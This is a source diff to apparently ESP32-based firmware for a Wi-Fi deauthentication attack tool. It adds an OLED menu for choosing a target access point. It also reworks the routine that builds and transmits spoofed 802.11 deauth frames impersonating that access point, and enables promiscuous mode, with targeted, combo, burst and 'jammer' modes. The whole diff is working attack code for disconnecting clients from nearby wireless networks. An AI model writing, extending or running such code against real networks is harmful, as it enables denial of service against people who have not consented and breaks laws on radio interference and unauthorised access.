@@ -1,8 +1,10 @@
 #include "esp_wifi.h"
+#include "stdint.h"
 #include "wifi_deauth.h"
 #include "tool_state.h"
 #include "display_common.h"
 #include "wifi_common.h"
+#include "console_common.h"
 #include <cstdio>
 #include <cstring>
 
@@ -70,23 +72,117 @@ static bool parse_bssid(const char *bssid_str, uint8_t out[6])
     return true;
 }
 
-void _send_deauth_frame_to_ap(uint8_t ap_addr[], uint8_t target_addr[])
+static int select_target_network()
 {
-    memcpy(&deauthPacket[10], ap_addr, 6);
-    memcpy(&deauthPacket[16], ap_addr, 6);
-    memcpy(&deauthPacket[4], target_addr, 6);
+    if (scanned_network_count <= 0)
+    {
+        return -1;
+    }
 
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    int selected_option = 0;
+    const int items_per_page = 4;
+    clear_button_state();
+
+    while (true)
+    {
+        if (is_movefd_pressed)
+        {
+            is_movefd_pressed = false;
+            selected_option++;
+            if (selected_option >= scanned_network_count)
+            {
+                selected_option = 0;
+            }
+        }
+
+        if (is_movebd_pressed)
+        {
+            is_movebd_pressed = false;
+            selected_option--;
+            if (selected_option < 0)
+            {
+                selected_option = scanned_network_count - 1;
+            }
+        }
+
+        if (is_select_pressed)
+        {
+            is_select_pressed = false;
+            clear_button_state();
+            return selected_option;
+        }
+
+        if (is_home_pressed)
+        {
+            is_home_pressed = false;
+            clear_button_state();
+            return -1;
+        }
+
+        display.clearDisplay();
+        display.setTextColor(SSD1306_WHITE);
+        display.setTextSize(1);
+        display.setCursor(2, 2);
+        display.print("TARGET AP");
+        display.drawLine(0, 10, 127, 10, SSD1306_WHITE);
+
+        int page = selected_option / items_per_page;
+        int start = page * items_per_page;
+        int end = start + items_per_page;
+        if (end > scanned_network_count)
+        {
+            end = scanned_network_count;
+        }
+
+        int y = 14;
+        for (int i = start; i < end; i++)
+        {
+            if (i == selected_option)
+            {
+                display.fillRect(0, y, 125, 10, SSD1306_WHITE);
+                display.setTextColor(SSD1306_BLACK);
+            }
+            else
+            {
+                display.setTextColor(SSD1306_WHITE);
+            }
+
+            display.setCursor(2, y);
+            String ssid = networks[i].ssid.length() > 0 ? networks[i].ssid : "<hidden>";
+            if (ssid.length() > 12)
+            {
+                ssid = ssid.substring(0, 12);
+            }
+            display.print(ssid);
+            display.setCursor(82, y);
+            display.print(networks[i].rssi);
+            y += 11;
+        }
+
+        int total_pages = (scanned_network_count + items_per_page - 1) / items_per_page;
+        int bar_height = 64 / total_pages;
+        int bar_y = page * bar_height;
+        display.fillRect(125, bar_y, 3, bar_height, SSD1306_WHITE);
+
+        display.display();
+        delay(30);
+    }
 }
 
-void _broadcast_send_deauth_frame(uint8_t ap_addr[], uint8_t target_addr[])
+bool _send_deauth_frame_to_ap(uint8_t target_addr[])
 {
-    (void)target_addr;
-    memcpy(&deauthPacket[10], ap_addr, 6);
-    memcpy(&deauthPacket[16], ap_addr, 6);
-    memcpy(&deauthPacket[4], broadcastAddress, 6);
-
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    uint8_t packet[26];
+    memcpy(packet, deauthPacket, 26);
+    
+    // Source address (the AP we're impersonating)
+    memcpy(&packet[10], target_addr, 6);
+    
+    // BSSID (also the AP address)
+    memcpy(&packet[16], target_addr, 6);
+    
+    // Send the frame
+    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    return true;
 }
 
 void launch_deauth(const char *attack_type, bool random_mac, bool burst_mode, bool safe_mode, bool jammer_mode)
@@ -106,7 +202,9 @@ void launch_deauth(const char *attack_type, bool random_mac, bool burst_mode, bo
     uint32_t sent_count = 0;
     uint8_t target_addr[6];
     uint8_t target_count = static_cast<uint8_t>(scanned_network_count > MAX_NETWORKS ? MAX_NETWORKS : scanned_network_count);
+    int start_target_index = 0;
     uint8_t repeats_per_target = burst_mode ? 3 : 1;
+    
     if (jammer_mode)
     {
         repeats_per_target += 2;
@@ -125,9 +223,22 @@ void launch_deauth(const char *attack_type, bool random_mac, bool burst_mode, bo
     {
         send_delay = 35;
     }
+    
+    esp_wifi_set_promiscuous(true);
 
     if (strcmp(attack_type, "targeted_deauth") == 0)
     {
+        
+        int selected_target = select_target_network();
+        if (selected_target < 0)
+        {
+            show_task_progress_frame("Target select canceled", 100, phase, false);
+            delay(350);
+            disable_wifi();
+            return;
+        }
+
+        start_target_index = selected_target;
         target_count = 1;
     }
 
@@ -138,7 +249,7 @@ void launch_deauth(const char *attack_type, bool random_mac, bool burst_mode, bo
             break;
         }
 
-        for (uint8_t idx = 0; idx < target_count; idx++)
+        for (int idx = start_target_index; idx < (start_target_index + target_count); idx++)
         {
             if (!parse_bssid(networks[idx].bssid, target_addr))
             {
@@ -148,25 +259,35 @@ void launch_deauth(const char *attack_type, bool random_mac, bool burst_mode, bo
             if (networks[idx].channel > 0)
             {
                 esp_wifi_set_channel(networks[idx].channel, WIFI_SECOND_CHAN_NONE);
+                delay(1);  // Let radio settle on new channel
             }
 
             for (uint8_t rep = 0; rep < repeats_per_target; rep++)
             {
                 if (strcmp(attack_type, "targeted_deauth") == 0)
                 {
-                    _send_deauth_frame_to_ap(target_addr, broadcastAddress);
-                    sent_count++;
+                    if (_send_deauth_frame_to_ap(target_addr))
+                    {
+                        sent_count++;
+                    }
                 }
                 else if (strcmp(attack_type, "combo_deauth") == 0)
                 {
-                    _send_deauth_frame_to_ap(target_addr, broadcastAddress);
-                    _broadcast_send_deauth_frame(target_addr, broadcastAddress);
-                    sent_count += 2;
+                    if (_send_deauth_frame_to_ap(target_addr))
+                    {
+                        sent_count++;
+                    }
+                    //if (_broadcast_send_deauth_frame(target_addr, broadcastAddress))
+                    //{
+                    //    sent_count++;
+                    //}
                 }
                 else
                 {
-                    _broadcast_send_deauth_frame(target_addr, broadcastAddress);
-                    sent_count++;
+                    //if (_broadcast_send_deauth_frame(target_addr, broadcastAddress))
+                    //{
+                    //    sent_count++;
+                    //}
                 }
             }
         }
@@ -185,11 +306,12 @@ void launch_deauth(const char *attack_type, bool random_mac, bool burst_mode, bo
         show_task_progress_frame("Broadcast DE-AUTH stopped", 100, phase, false);
     }
 
-    delay(350);
+    delay(250);
     is_menu_pressed = false;
     is_home_pressed = false;
     is_select_pressed = false;
     is_movefd_pressed = false;
     is_movebd_pressed = false;
+    esp_wifi_set_promiscuous(false);
     disable_wifi();
 }
